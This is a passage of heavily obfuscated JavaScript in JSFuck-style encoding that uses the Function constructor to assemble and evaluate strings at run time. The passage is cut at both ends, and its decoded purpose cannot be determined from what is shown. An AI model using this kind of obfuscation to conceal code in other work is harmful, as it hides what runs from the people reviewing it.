+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([]+{})[!+[]+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(+[]+[])+(+{}+[])[+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+(+{}+[])[+!![]]+(!![]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!+[]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+([]+{})[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(+!![]+[])+(+[]+[])+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[+[]]+(+{}+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+([][[]]+[])[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{